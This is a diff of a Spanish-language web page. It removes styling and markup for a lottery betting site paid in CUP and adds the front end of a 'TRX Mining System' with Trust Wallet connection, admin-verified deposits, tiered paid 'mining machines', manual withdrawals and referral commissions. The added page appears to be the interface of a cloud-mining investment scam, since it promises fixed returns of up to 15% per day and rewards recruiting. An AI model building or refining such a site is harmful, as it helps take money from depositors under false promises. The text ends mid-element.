-            border: 1px solid var(--light-accent);
-            font-size: 0.9rem;
-        }
-
-        .receipt-title {
-            text-align: center;
-            color: var(--primary);
-            margin-bottom: 12px;
-            font-size: 1.1rem;
-            font-weight: 600;
-        }
-
-        .receipt-details {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-
-        @media (min-width: 400px) {
-            .receipt-details {
-                grid-template-columns: 1fr 1fr;
-            }
-        }
-
-        .receipt-detail {
-            margin-bottom: 5px;
-            font-size: 0.9rem;
-        }
-
-        .receipt-detail-label {
-            color: var(--light-text);
-            font-size: 0.8rem;
-        }
-
-        .receipt-detail-value {
-            font-weight: 600;
-            font-size: 0.9rem;
-            word-break: break-all;
-        }
-
-        .receipt-numbers {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 5px;
-            margin: 12px 0;
-        }
-
-        .receipt-number {
-            background: rgba(244, 179, 21, 0.2);
-            padding: 4px 8px;
-            border-radius: 5px;
-            font-weight: 600;
-            font-size: 0.85rem;
-        }
-
-        .receipt-total {
-            text-align: right;
-            font-weight: 700;
-            font-size: 1rem;
-            margin-top: 8px;
-            color: var(--primary);
-        }
-
-        .receipt-footer {
-            text-align: center;
-            margin-top: 12px;
-            font-size: 0.75rem;
-            color: var(--light-text);
-        }
-
-        #welcomeMessage {
-            text-align: center;
-            padding: 30px 15px;
-        }
-
-        #welcomeMessage h2 {
-            margin-bottom: 15px;
-            color: var(--primary);
-            font-size: 1.5rem;
-        }
-
-        #welcomeMessage p {
-            margin-bottom: 20px;
-            color: var(--light-text);
-            font-size: 1rem;
-        }
-
-        #welcomeMessage .auth-btn {
-            padding: 10px 20px;
-            font-size: 1rem;
-        }
-
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: var(--light-accent);
-            border-radius: 10px;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: var(--primary);
-            border-radius: 10px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--secondary);
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 3px solid var(--light-accent);
-            border-radius: 50%;
-            border-top-color: var(--primary);
-            animation: spin 1s ease-in-out infinite;
-            vertical-align: middle;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .error-message {
-            color: var(--danger);
-            font-size: 0.8rem;
-            margin-top: 5px;
-            display: none;
-        }
-
-        .payment-instructions {
-            background: rgba(244, 179, 21, 0.05);
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-size: 0.85rem;
-            border-left: 3px solid var(--primary);
-        }
-
-        .payment-instructions p {
-            margin-bottom: 8px;
-        }
-
-        .payment-instructions strong {
-            color: var(--primary);
-        }
-
-        .account-number {
-            background: rgba(244, 179, 21, 0.1);
-            padding: 8px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 1rem;
-            color: var(--primary);
-            text-align: center;
-            margin: 10px 0;
-            word-break: break-all;
-        }
-
-        .cancel-bet-btn {
-            background: rgba(244, 67, 54, 0.1);
-            border: 1px solid var(--danger);
-            padding: 6px 12px;
-            border-radius: 20px;
-            color: var(--danger);
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-size: 0.8rem;
-            margin-top: 8px;
-        }
-
-        .cancel-bet-btn:hover {
-            background: rgba(244, 67, 54, 0.2);
-        }
-
-        .time-counter {
-            color: var(--primary);
-            font-weight: 600;
-            font-size: 0.8rem;
-            margin-top: 5px;
-        }
-
-        .number-limit {
-            font-size: 0.8rem;
-            color: var(--light-text);
-            margin-top: 5px;
-        }
-
-        .withdraw-btn {
-            background: rgba(76, 175, 80, 0.1);
-            border: 1px solid var(--success);
-            color: var(--success);
-        }
-
-        .withdraw-btn:hover {
-            background: rgba(76, 175, 80, 0.2);
-            box-shadow: 0 6px 15px rgba(76, 175, 80, 0.1);
-        }
-
-        .clear-bets-btn {
-            background: rgba(244, 67, 54, 0.1);
-            border: 1px solid var(--danger);
-            padding: 6px 12px;
-            border-radius: 20px;
-            color: var(--danger);
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-size: 0.8rem;
-            margin-left: auto;
-            display: block;
-            margin-top: 10px;
-        }
-
-        .clear-bets-btn:hover {
-            background: rgba(244, 67, 54, 0.2);
-        }
-
-        .swal2-popup {
-            background: var(--white) !important;
-            border: 1px solid var(--light-accent) !important;
-            color: var(--text) !important;
-        }
-
-        .swal2-title {
-            color: var(--secondary) !important;
-        }
-
-        .swal2-content {
-            color: var(--light-text) !important;
-        }
-
-        .swal2-confirm {
-            background-color: var(--primary) !important;
-        }
-
-        .swal2-cancel {
-            background-color: var(--light-accent) !important;
-            color: var(--text) !important;
-        }
-
-        .transaction-number {
-            margin-top: 15px;
-        }
-
-        .bet-limit-info {
-            background: rgba(244, 179, 21, 0.05);
-            padding: 8px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-size: 0.85rem;
-            border-left: 3px solid var(--primary);
-        }
-
-        .bet-dice-info {
-            background: rgba(244, 179, 21, 0.1);
-            padding: 4px 8px;
-            border-radius: 5px;
-            font-size: 0.8rem;
-            margin-top: 5px;
-        }
-
-        .game-disabled {
-            position: relative;
-        }
-
-        .game-disabled::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 15px;
-            z-index: 1;
-        }
-
-        .game-disabled-message {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: var(--danger);
-            color: var(--white);
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-weight: bold;
-            z-index: 2;
-            text-align: center;
-            width: 80%;
-        }
-
-        .game-disabled-banner {
-            background: var(--danger);
-            color: var(--white);
-            padding: 10px;
-            text-align: center;
-            border-radius: 5px;
-            margin-bottom: 15px;
-            font-weight: bold;
-            display: none;
-        }
-
-        .bet-time-banner {
-            background: var(--warning);
-            color: var(--white);
-            padding: 10px;
-            text-align: center;
-            border-radius: 5px;
-            margin-bottom: 15px;
-            font-weight: bold;
-            display: none;
-        }
-
-        .bet-tabs {
-            display: flex;
-            margin-bottom: 15px;
-            border-bottom: 1px solid var(--light-accent);
-        }
-
-        .bet-tab {
-            padding: 10px 15px;
-            cursor: pointer;
-            font-weight: 600;
-            color: var(--light-text);
-            border-bottom: 2px solid transparent;
-            transition: all 0.2s;
-        }
-
-        .bet-tab.active {
-            color: var(--primary);
-            border-bottom-color: var(--primary);
-        }
-
-        .bet-tab:hover:not(.active) {
-            color: var(--text);
-        }
-
-        .bet-content {
-            display: none;
-        }
-
-        .bet-content.active {
-            display: block;
-        }
-
-        .contact-info {
-            text-align: center;
-            margin-top: 20px;
-            padding: 15px;
-            background: var(--white);
-            border-radius: 10px;
-            font-size: 0.9rem;
-            border: 1px solid var(--light-accent);
-        }
-
-        .contact-info a {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .contact-info a:hover {
-            text-decoration: underline;
-        }
-
-        .bet-type-selector {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        .bet-type-btn {
-            flex: 1;
-            padding: 10px;
-            background: var(--white);
-            border: 1px solid var(--light-accent);
-            border-radius: 8px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-weight: 600;
-        }
-
-        .bet-type-btn:hover {
-            background: rgba(244, 179, 21, 0.1);
-            border-color: var(--primary);
-        }
-
-        .bet-type-btn.selected {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            border-color: var(--primary);
-            color: var(--white);
-            box-shadow: 0 5px 10px rgba(244, 179, 21, 0.2);
-        }
-
-        .prize-info {
-            background: rgba(76, 175, 80, 0.05);
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-size: 0.85rem;
-            border-left: 3px solid var(--success);
-        }
-
-        .prize-info p {
-            margin: 5px 0;
-        }
-
-        .info-icon {
-            color: var(--info);
-            cursor: pointer;
-            margin-left: 5px;
-            font-size: 1rem;
-        }
-
-        .announcement-banner {
-            background: var(--info);
-            color: var(--white);
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 15px;
-            text-align: center;
-            font-weight: 600;
-            display: none;
-        }
-
-        .social-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            background: #1877F2;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            font-size: 0.9rem;
-        }
-
-        .social-btn:hover {
-            background: #166FE5;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
         }
     </style>
 </head>
 <body>
+    <header>
+        <div class="container">
+            <h1 class="app-title">TRX Mining System 2025</h1>
+            <p class="app-subtitle">Sistema completo de minería con Trust Wallet y aprobación administrativa</p>
+        </div>
+    </header>
+    
     <div class="container">
-        <header>
-            <div class="logo">
-                <div class="logo-icon">F</div>
-                <h1>Florida Lotería</h1>
-            </div>
-            <div class="user-info" id="userInfo" style="display: none;">
-                <span class="user-name" id="userNameDisplay"></span>
-                <div class="balance">
-                    <span>Balance:</span>
-                    <span class="balance-amount" id="userBalance">0</span>
-                    <span class="cup-icon">CUP</span>
+        <!-- Sección de Registro/Login -->
+        <div id="auth-section">
+            <div class="card">
+                <h2 class="card-title">Iniciar Sesión / Registrarse</h2>
+                <div id="auth-alert"></div>
+                <div class="form-group">
+                    <label for="email">Correo Electrónico</label>
+                    <input type="email" id="email" placeholder="Ingresa tu correo electrónico">
                 </div>
-                <button class="auth-btn" id="depositBtn">Depositar</button>
-                <button class="auth-btn withdraw-btn" id="withdrawBtn">Retirar</button>
-                <button class="auth-btn logout-btn" id="logoutBtn">Cerrar Sesión</button>
-                <button class="social-btn" id="facebookBtn">
-                    <i class="fab fa-facebook-f"></i> Facebook
-                </button>
+                <div class="form-group">
+                    <label for="password">Contraseña</label>
+                    <input type="password" id="password" placeholder="Ingresa tu contraseña">
+                </div>
+                <div class="form-group">
+                    <label for="referral-code">Código de Referido (Opcional)</label>
+                    <input type="text" id="referral-code" placeholder="Ingresa código de referido si tienes">
+                </div>
+                <div class="button-group">
+                    <button id="login-btn">Iniciar Sesión</button>
+                    <button id="register-btn">Registrarse</button>
+                </div>
+                <div class="password-reset">
+                    <a id="forgot-password">¿Olvidaste tu contraseña?</a>
+                </div>
+                <div id="auth-loader" class="loader hidden" style="margin-top: 20px;"></div>
             </div>
-            <div class="user-info" id="guestInfo">
-                <button class="auth-btn" id="loginBtn">Iniciar Sesión</button>
-                <button class="auth-btn" id="signupBtn">Registrarse</button>
-                <button class="social-btn" id="facebookBtnGuest">
-                    <i class="fab fa-facebook-f"></i> Facebook
-                </button>
+        </div>
+        
+        <!-- Panel de Control (inicialmente oculto) -->
+        <div id="dashboard" class="hidden">
+            <div class="nav">
+                <div class="nav-item active" data-tab="wallet">Billetera</div>
+                <div class="nav-item" data-tab="mining">Minería</div>
+                <div class="nav-item" data-tab="deposit">Depositar</div>
+                <div class="nav-item" data-tab="withdraw">Retirar</div>
+                <div class="nav-item" data-tab="referrals">Referidos</div>
+                <div class="nav-item" data-tab="support">Soporte</div>
+                <div class="nav-item" id="logout-btn">Cerrar Sesión</div>
             </div>
-        </header>
-
-        <div class="game-disabled-banner" id="globalDisabledBanner">
-            Las apuestas están temporalmente deshabilitadas por el administrador
-        </div>
-
-        <div class="bet-time-banner" id="betTimeBanner">
-            Las apuestas están cerradas. Horario de apuestas: 12:00 AM - 1:00 PM y 2:00 PM - 9:00 PM
-        </div>
-
-        <div class="announcement-banner" id="announcementBanner">
-            <div id="announcementText"></div>
-        </div>
-
-        <main class="main-content" id="appContent" style="display: none;">
-            <div class="panel bet-panel" id="betPanel">
-                <h2 class="panel-title">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.121 15.536c-1.171 1.952-3.07 1.952-4.242 0-1.172-1.953-1.172-5.119 0-7.072 1.171-1.952 3.07-1.952 4.242 0M8 10.5h4m-4 3h4m9-1.5a9 9 0 11-18 0 9 9 0 0118 0z" />
-                    </svg>
-                    Realizar Apuesta
-                </h2>
+            
+            <div id="dashboard-alert"></div>
+            
+            <!-- Conectar con Trust Wallet -->
+            <div class="trust-connect">
+                <h3>Conectar con Trust Wallet</h3>
+                <p>Para realizar transacciones reales, conecta tu Trust Wallet</p>
+                <button id="connect-trust">Conectar Trust Wallet</button>
+                <div id="trust-status" class="wallet-status disconnected">No conectado</div>
+            </div>
+            
+            <!-- Sección de Billetera Virtual -->
+            <div class="tab-content" id="wallet-tab">
+                <div class="wallet-section">
+                    <div class="wallet-card">
+                        <h2 class="card-title" style="color: white;">Billetera Virtual TRX</h2>
+                        <div class="wallet-balance" id="wallet-balance">0.00 TRX</div>
+                        <div class="wallet-actions">
+                            <button class="wallet-action-btn" data-target-tab="deposit">Depositar</button>
+                            <button class="wallet-action-btn" data-target-tab="withdraw">Retirar</button>
+                            <button class="wallet-action-btn" data-target-tab="mining">Activar Máquinas</button>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2 class="card-title">Resumen de Fondos</h2>
+                        <div class="dashboard-grid">
+                            <div class="stat-card">
+                                <h3 class="stat-label">Balance Total</h3>
+                                <div class="stat-value" id="total-balance">0 TRX</div>
+                                <p>Total de TRX en tu cuenta</p>
+                            </div>
+                            
+                            <div class="stat-card">
+                                <h3 class="stat-label">Ganancias Mineras</h3>
+                                <div class="stat-value" id="mining-earnings">0 TRX</div>
+                                <p>Disponibles para retiro</p>
+                            </div>
+                            
+                            <div class="stat-card">
+                                <h3 class="stat-label">Ganancias por Referidos</h3>
+                                <div class="stat-value" id="referral-earnings-wallet">0 TRX</div>
+                                <p>Comisiones de referidos</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2 class="card-title">Últimas Transacciones</h2>
+                        <ul class="transaction-list" id="wallet-transactions">
+                            <li class="transaction-item">
+                                <div class="transaction-desc">No hay transacciones aún</div>
+                                <div class="transaction-amount">0 TRX</div>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Sección de Minería -->
+            <div class="tab-content hidden" id="mining-tab">
+                <div class="dashboard-grid">
+                    <div class="card stat-card">
+                        <h3 class="stat-label">Balance Actual</h3>
+                        <div class="stat-value" id="current-balance">0 TRX</div>
+                        <p>Ganancias mineras incluidas</p>
+                    </div>
+                    
+                    <div class="card stat-card">
+                        <h3 class="stat-label">Ganancias Mineras</h3>
+                        <div class="stat-value" id="mining-earnings-tab">0 TRX</div>
+                        <p>Ganancias disponibles para retiro</p>
+                    </div>
+                    
+                    <div class="card stat-card">
+                        <h3 class="stat-label">Total Depositado</h3>
+                        <div class="stat-value" id="total-deposited">0 TRX</div>
+                        <p>Total de TRX depositados</p>
+                    </div>
+                </div>
                 
-                <div class="bet-tabs">
-                    <div class="bet-tab active" data-tab="day">Medio Día</div>
-                    <div class="bet-tab" data-tab="night">Noche</div>
+                <!-- Contador moderno de minería -->
+                <div class="modern-countdown">
+                    <h2 class="countdown-title">Próxima generación de TRX</h2>
+                    <div class="countdown-digits">
+                        <div class="countdown-digit">
+                            <div class="digit-value" id="countdown-hours">24</div>
+                            <div class="digit-label">Horas</div>
+                        </div>
+                        <div class="countdown-digit">
+                            <div class="digit-value" id="countdown-minutes">00</div>
+                            <div class="digit-label">Minutos</div>
+                        </div>
+                        <div class="countdown-digit">
+                            <div class="digit-value" id="countdown-seconds">00</div>
+                            <div class="digit-label">Segundos</div>
+                        </div>
+                    </div>
+                    <div class="mining-progress">
+                        <div class="progress-bar" id="mining-progress-bar"></div>
+                    </div>
+                    <div class="accumulated-earnings" id="accumulated-earnings">TRX acumulados: 0.00</div>
                 </div>
                 
-                <div class="bet-content active" id="dayBetContent">
-                    <div class="bet-type-selector">
-                        <div class="bet-type-btn selected" data-type="fijo">Fijo (x90)</div>
-                        <div class="bet-type-btn" data-type="corrido">Corrido (x25)</div>
-                    </div>
-                    <div class="number-grid" id="dayNumberGrid"></div>
-                    <div class="bet-controls">
-                        <div class="bet-amount">
-                            <input type="number" id="dayBetAmount" placeholder="Cantidad a apostar (máx 50 por número)" min="1" max="50">
-                            <span>CUP</span>
+                <div class="card">
+                    <h2 class="card-title">Máquinas Mineras</h2>
+                    <div class="miners-grid">
+                        <div class="miner-card active" id="miner-free">
+                            <div class="miner-icon">⛏️</div>
+                            <h3 class="miner-name">Minería Básica</h3>
+                            <p class="miner-desc">Minería gratuita sin inversión</p>
+                            <div class="miner-profit">1 TRX cada 24h</div>
+                            <button class="btn-success activate-miner" data-miner="free" disabled>Activada</button>
                         </div>
-                        <div class="prize-info" id="dayPrizeInfo">
-                            Premio fijo: 90 CUP por cada CUP apostado
+                        
+                        <div class="miner-card inactive" id="miner-basic">
+                            <div class="miner-icon">⚒️</div>
+                            <h3 class="miner-name">Minería Básica Plus</h3>
+                            <p class="miner-desc">Inversión: 10 TRX</p>
+                            <div class="miner-profit">2 TRX cada 24h</div>
+                            <button class="activate-miner" data-miner="basic">Activar por 10 TRX</button>
                         </div>
-                        <div class="number-limit" id="dayNumberLimitInfo">Puedes apostar hasta 50 CUP por número</div>
-                        <div class="quick-bets">
-                            <button class="quick-bet" data-amount="10" data-target="dayBetAmount">10 CUP</button>
-                            <button class="quick-bet" data-amount="20" data-target="dayBetAmount">20 CUP</button>
-                            <button class="quick-bet" data-amount="50" data-target="dayBetAmount">50 CUP</button>
+                        
+                        <div class="miner-card inactive" id="miner-advanced">
+                            <div class="miner-icon">🔨</div>
+                            <h3 class="miner-name">Minería Avanzada</h3>
+                            <p class="miner-desc">Inversión: 30 TRX</p>
+                            <div class="miner-profit">5 TRX cada 24h</div>
+                            <button class="activate-miner" data-miner="advanced">Activar por 30 TRX</button>
                         </div>
-                        <button class="place-bet" id="placeDayBetBtn" disabled>Apostar</button>
-                        <div id="cancelDayBetSection" style="display: none;">
-                            <button class="cancel-bet-btn" id="cancelDayBetBtn">Cancelar Apuesta</button>
-                            <div class="time-counter" id="cancelDayTimer">Tiempo restante: 1:00</div>
+                        
+                        <div class="miner-card inactive" id="miner-pro">
+                            <div class="miner-icon">🏭</div>
+                            <h3 class="miner-name">Minería Profesional</h3>
+                            <p class="miner-desc">Inversión: 100 TRX</p>
+                            <div class="miner-profit">15 TRX cada 24h</div>
+                            <button class="activate-miner" data-miner="pro">Activar por 100 TRX</button>
                         </div>
                     </div>
                 </div>
                 
-                <div class="bet-content" id="nightBetContent">
-                    <div class="bet-type-selector">
-                        <div class="bet-type-btn selected" data-type="fijo">Fijo (x90)</div>
-                        <div class="bet-type-btn" data-type="corrido">Corrido (x25)</div>
+                <div class="card">
+                    <h2 class="card-title">Historial de Minería</h2>
+                    <ul class="transaction-list" id="mining-history">
+                        <li class="transaction-item">
+                            <div class="transaction-desc">No hay actividad minera aún</div>
+                            <div class="transaction-amount">0 TRX</div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Sección de Depósito -->
+            <div class="tab-content hidden" id="deposit-tab">
+                <div class="card">
+                    <h2 class="card-title">Depositar TRX</h2>
+                    <p>Para activar máquinas mineras, realiza un depósito a la siguiente dirección. Los fondos se acreditarán después de la verificación administrativa.</p>
+                    
+                    <div class="form-group">
+                        <label for="deposit-amount">Cantidad a Depositar (Mínimo 10 TRX)</label>
+                        <input type="number" id="deposit-amount" placeholder="Ingresa la cantidad en TRX" min="10">
                     </div>
-                    <div class="number-grid" id="nightNumberGrid"></div>
-                    <div class="bet-controls">
-                        <div class="bet-amount">
-                            <input type="number" id="nightBetAmount" placeholder="Cantidad a apostar (máx 50 por número)" min="1" max="50">
-                            <span>CUP</span>
+                    
+                    <div class="form-group">
+                        <label for="deposit-address">Dirección de Wallet para Depósito</label>
+                        <input type="text" id="deposit-address" value="TXYZ1234567890abcdefghijklmnopqrstuvw" readonly>
+                        <button id="copy-deposit-address" class="btn-success" style="margin-top: 10px;">Copiar Dirección</button>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="tx-hash">Hash de Transacción (Obligatorio para verificación)</label>
+                        <input type="text" id="tx-hash" placeholder="Ingresa el hash de tu transacción">
+                    </div>
+                    
+                    <div class="button-group">
+                        <button id="verify-transaction" class="btn-success">Solicitar Verificación</button>
+                        <button id="send-trx-trust" class="btn-warning">Enviar TRX con Trust Wallet</button>
+                    </div>
+                    
+                    <div id="deposit-loader" class="loader hidden" style="margin-top: 20px;"></div>
+                    
+                    <p style="margin-top: 15px; font-style: italic;">
+                        Después de depositar, los fondos se acreditarán después de la verificación administrativa (generalmente dentro de 24 horas).
+                    </p>
+                </div>
+                
+                <div class="card">
+                    <h2 class="card-title">Historial de Depósitos</h2>
+                    <div id="deposits-container">
+                        <p>No hay depósitos aún.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Sección de Retiro -->
+            <div class="tab-content hidden" id="withdraw-tab">
+                <div class="card">
+                    <h2 class="card-title">Retirar Ganancias (Mínimo 10 TRX)</h2>
+                    <div class="form-group">
+                        <label for="withdraw-amount">Cantidad a Retirar</label>
+                        <input type="number" id="withdraw-amount" placeholder="Ingresa la cantidad en TRX" min="10">
+                    </div>
+                    <div class="form-group">
+                        <label for="withdraw-address">Dirección de Retiro TRX</label>
+                        <input type="text" id="withdraw-address" placeholder="Ingresa tu dirección TRX">
+                    </div>
+                    <div class="button-group">
+                        <button id="withdraw-btn" class="btn-warning">Solicitar Retiro</button>
+                    </div>
+                    <div id="withdraw-loader" class="loader hidden" style="margin-top: 20px;"></div>
+                    <p style="margin-top: 15px;">Solo puedes retirar las ganancias mineras disponibles. Los retiros se procesan manualmente por el administrador.</p>
+                </div>
+                
+                <div class="card">
+                    <h2 class="card-title">Historial de Retiros</h2>
+                    <ul class="transaction-list" id="withdraw-history">
+                        <li class="transaction-item">
+                            <div class="transaction-desc">No hay retiros aún</div>
+                            <div class="transaction-amount">0 TRX</div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Sección de Referidos -->
+            <div class="tab-content hidden" id="referrals-tab">
+                <div class="referral-system">
+                    <h2 class="card-title" style="color: white;">Sistema de Referidos</h2>
+                    <p>Invita a tus amigos y gana comisiones del 10% de sus ganancias mineras.</p>
+                    
+                    <div class="referral-link">
+                        <span id="referral-link-text">https://trxmining.com/ref/</span>
+                        <button id="copy-referral-link" class="btn-referral">Copiar</button>
+                    </div>
+                    
+                    <div class="referral-stats">
+                        <div class="referral-stat">
+                            <div class="referral-stat-value" id="total-referrals">0</div>
+                            <div class="referral-stat-label">Referidos Totales</div>
                         </div>
-                        <div class="prize-info" id="nightPrizeInfo">
-                            Premio fijo: 90 CUP por cada CUP apostado
+                        
+                        <div class="referral-stat">
+                            <div class="referral-stat-value" id="active-referrals">0</div>
+                            <div class="referral-stat-label">Referidos Activos</div>
                         </div>
-                        <div class="number-limit" id="nightNumberLimitInfo">Puedes apostar hasta 50 CUP por número</div>
-                        <div class="quick-bets">
-                            <button class="quick-bet" data-amount="10" data-target="nightBetAmount">10 CUP</button>
-                            <button class="quick-bet" data-amount="20" data-target="nightBetAmount">20 CUP</button>
-                            <button class="quick-bet" data-amount="50" data-target="nightBetAmount">50 CUP</button>
+                        
+                        <div class="referral-stat">
+                            <div class="referral-stat-value" id="referral-earnings">0 TRX</div>
+                            <div class="referral-stat-label">Ganancias por Referidos</div>
                         </div>
-                        <button class="place-bet" id="placeNightBetBtn" disabled>Apostar</button>
-                        <div id="cancelNightBetSection" style="display: none;">
-                            <button class="cancel-bet-btn" id="cancelNightBetBtn">Cancelar Apuesta</button>
-                            <div class="time-counter" id="cancelNightTimer">Tiempo restante: 1:00</div>
+                        
+                        <div class="referral-stat">
+                            <div class="referral-stat-value" id="referral-level">1</div>
+                            <div class="referral-stat-label">Nivel de Referido</div>
                         </div>
                     </div>
                 </div>
-            </div>
-
-            <div class="panel results-panel">
-                <h2 class="panel-title">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
-                    </svg>
-                    Últimos Resultados
-                </h2>
-                <div class="results-list" id="resultsList"></div>
-            </div>
-
-            <div class="panel my-bets-panel">
-                <h2 class="panel-title">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                    </svg>
-                    Mis Apuestas
-                </h2>
-                <div class="bets-list" id="betsList"></div>
-                <button class="clear-bets-btn" id="clearBetsBtn">Borrar Mis Apuestas</button>
-            </div>
-        </main>
-
-        <div id="welcomeMessage" style="text-align: center; padding: 50px 20px;">
-            <h2 style="margin-bottom: 20px; color: var(--primary);">Bienvenido al Sistema de Lotería Florida</h2>
-            <p style="margin-bottom: 30px; color: var(--light-text);">Inicia sesión o regístrate para comenzar a jugar</p>
-            <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
-                <button class="auth-btn" id="welcomeLoginBtn">Iniciar Sesión</button>
-                <button class="auth-btn" id="welcomeSignupBtn">Registrarse</button>
-                <button class="social-btn" id="welcomeFacebookBtn">
-                    <i class="fab fa-facebook-f"></i> Facebook
-                </button>
-            </div>
-        </div>
-
-        <div class="contact-info">
-            <p>¿Necesitas ayuda? Contacta al administrador:</p>
-            <p><a href="https://t.me/cubamark10" target="_blank">@cubamark10 en Telegram</a></p>
-        </div>
-    </div>
-
-    <div class="modal-overlay" id="depositModal">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Depositar CUP</h3>
-                <button class="close-modal" id="closeDepositModal">&times;</button>
-            </div>
-            <div class="modal-body">
-                <div class="form-group">
-                    <label for="depositAmount">Cantidad a depositar (CUP)</label>
-                    <input type="number" id="depositAmount" min="1" placeholder="Ej: 1000">
-                    <div class="error-message" id="depositAmountError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="paymentMethod">Método de pago</label>
-                    <select id="paymentMethod" disabled>
-                        <option value="cup">Transferencia CUP</option>
-                    </select>
-                </div>
-                <div class="form-group cup-details">
-                    <div class="form-group transaction-number">
-                        <label for="transactionNumber">Número de transacción (obligatorio)</label>
-                        <input type="text" id="transactionNumber" placeholder="Número de transferencia o comprobante" required>
-                        <div class="error-message" id="transactionNumberError"></div>
-                    </div>
-                    <div class="payment-instructions">
-                        <p>1. Realiza una transferencia a la cuenta:</p>
-                        <div class="account-number">9227 0699 9771 1927</div>
-                        <p>2. Importe: <strong id="depositAmountDisplay">0</strong> CUP</p>
-                        <p>3. Envía el comprobante con tu número de usuario:</p>
-                        <div class="account-number" id="userIdDisplay"></div>
+                
+                <div class="card">
+                    <h2 class="card-title">Tus Referidos</h2>
+                    <div id="referrals-container">
+                        <p>No tienes referidos aún. Comparte tu enlace para comenzar a ganar comisiones.</p>
                     </div>
                 </div>
-            </div>
-            <div class="modal-footer">
-                <button class="modal-btn cancel" id="cancelDeposit">Cancelar</button>
-                <button class="modal-btn confirm" id="confirmDeposit">Confirmar Depósito</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="modal-overlay" id="withdrawModal">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Retirar CUP</h3>
-                <button class="close-modal" id="closeWithdrawModal">&times;</button>
-            </div>
-            <div class="modal-body">
-                <div class="form-group">
-                    <label for="withdrawAmount">Cantidad a retirar (CUP)</label>
-                    <input type="number" id="withdrawAmount" min="100" placeholder="Mínimo 100 CUP">
-                    <div class="error-message" id="withdrawAmountError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="cardNumber">Número de tarjeta</label>
-                    <input type="text" id="cardNumber" placeholder="Ej: 1234 5678 9012 3456">
-                    <div class="error-message" id="cardNumberError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="phoneNumber">Número de teléfono</label>
-                    <input type="text" id="phoneNumber" placeholder="Ej: 5551234567">
-                    <div class="error-message" id="phoneNumberError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="transferReference">Número de transferencia (opcional)</label>
-                    <input type="text" id="transferReference" placeholder="Si ya realizaste el envío">
-                    <div class="error-message" id="transferReferenceError"></div>
-                </div>
-                <div class="payment-instructions">
-                    <p><strong>Nota:</strong> Solo puedes realizar un retiro por día. El proceso puede tardar hasta 24 horas.</p>
-                    <p>Mínimo de retiro: <strong>100 CUP</strong></p>
+                
+                <div class="card">
+                    <h2 class="card-title">Ganancias por Referidos</h2>
+                    <ul class="transaction-list" id="referral-earnings-history">
